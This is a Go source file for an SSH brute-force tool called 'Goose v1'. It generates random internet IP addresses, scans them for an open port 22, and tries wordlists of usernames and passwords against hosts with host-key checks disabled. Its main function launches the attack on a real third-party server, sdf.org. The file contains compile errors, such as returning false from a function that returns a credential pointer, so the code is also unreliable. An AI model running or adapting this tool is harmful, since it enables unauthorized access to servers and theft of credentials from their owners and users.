package main

import (
	"strconv"
	"time"
	"fmt"
	"math/rand"
	"os"
	"bufio"
	//"bytes"
	"net"
	"golang.org/x/crypto/ssh"
	//"github.com/sfreiberg/simplessh"
)

type cred struct {
	url      string
	port     int
	username string
	password string
}

type creds []*cred

func readFile(f string) (data []string, err error) {
    b, err := os.Open(f)
    if err != nil {
        return
    }
    defer b.Close()    scanner := bufio.NewScanner(b)
    for scanner.Scan() {
        data = append(data, scanner.Text())
    }
    return
}

func randRange(min, max int) int {
    return rand.Intn(max-min) + min
}

//this functions attempts to open an SSH connection with the target IP, using a username and password
func sshConnect(ip, username, password string) bool {
	fmt.Println("Scanning " + ip + "...")
	sshConfig := &ssh.ClientConfig{
		User:            username,
		Auth:            []ssh.AuthMethod{ssh.Password(password)},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}
	conn, err := ssh.Dial("tcp", ip+":22", sshConfig)
	time.Sleep(100 * time.Millisecond)
	if err == nil {
		conn.Close()
		return true
	}
	return false
}

//this function checks if an IP has port 22 open
func sshScan(ip string) bool {
	fmt.Println("Scanning " + ip + "...")
	conn, err := net.DialTimeout("tcp", ip+":22", 25*time.Second)
	time.Sleep(100 * time.Millisecond)
	if err == nil {
		conn.Close()
		return true
	}
	return false
}

//this function attempts to connect to the target IP with all possible combinations of usernames and passwords, provided by two list files
func sshBrute(ip, usernameList, passwordList string) *cred {
	fmt.Println("Brute-forcing " + ip + "...")
	usernameList, err := readFile(usernameList)
	if err != nil {
		fmt.Println(err)
		return false
	}
	passwordList, err := readFile(passwordList)
	if err != nil {
		fmt.Println(err)
		return false
	}
	for _, username := range usernameList {
		for _, password := range passwordList {
			if sshConnect(ip, username, password) {
				return &cred{url: ip, port: 22, username: username, password: password}
			}
		}
	}
	return nil
}

//this function generates a random valid IPv4 address
func genAddress() string {
	rand.Seed(time.Now().UnixNano())
	ip := fmt.Sprintf("%d.%d.%d.%d", randRange(1, 254), randRange(1, 254), randRange(1, 254), randRange(1, 254))
	return ip
}

func main() {
	// note to self, add an item in the array with cred_list[x] = &cred{url, username, password}
	//var cred_list = make(creds, 50)

	//adds some FLAVOR to the startup
	ascii := "✩░▒▓▆▅▃▂▁𝐆𝐨𝐨𝐬𝐞 𝐯𝟏▁▂▃▅▆▓▒░✩"
	fmt.Println(ascii)
	
	/*
	fmt.Println("Starting Probing...")
	go fmt.Println("Google: " + strconv.FormatBool(sshScan("google.com")))
	fmt.Println("SDF: " + strconv.FormatBool(sshScan("sdf.org")))
	*/

	fmt.Println("Starting Brute-Force...")
	cred := sshBrute("sdf.org", "user.txt", "pass.txt")
	fmt.Println(cred)
}
